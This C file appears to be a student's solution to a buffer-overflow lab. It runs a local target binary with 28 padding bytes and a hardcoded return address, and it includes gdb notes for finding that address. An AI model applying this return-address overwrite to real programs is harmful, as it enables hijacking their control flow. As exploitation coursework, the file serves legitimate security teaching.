#include <stdio.h>
#include <stddef.h> // for NULL
#include <unistd.h>

int main(){
    //char *argv[]={"target2","AAAAAAAAAAAAAAAAAAAAAAAAAAAA\x34\x84\x04\x08", NULL};
    char *argv[]={"target2","AAAAAAAAAAAAAAAAAAAAAAAAAAAA\x21\x85\x04\x08", NULL};
    char *envp[]={NULL}; 
    execve("../targets/target2",argv,envp);
    return 0;
}


// gdb tutorial 
// https://wizardforcel.gitbooks.io/100-gdb-tips/content/call-func.html

// solution but i do not understand (
// https://www.hazzel.cn/2017/07/02/pwn-ret-address-overwrite/

// set disassembly-flavor intel
// put a checkpoint before ret of coupon() function
// b *0x080484cd


// https://visualgdb.com/gdbreference/commands/x
// https://sourceware.org/gdb/current/onlinedocs/gdb/Memory.html
// For example, ‘x/3uh 0x54320’ is a request to display three halfwords (h) of memory, formatted as unsigned decimal integers (‘u’), starting at address 0x54320. ‘x/4xw $sp’ prints the four words (‘w’) of memory above the stack pointer (here, ‘$sp’; see Registers) in hexadecimal (‘x’).

// info registers 
// check esp value, 
// x/x $esp
// this is the return affdree


// catch exec
// symbol-file ../targets/target3
// r
// b main

// dump assembly
// disas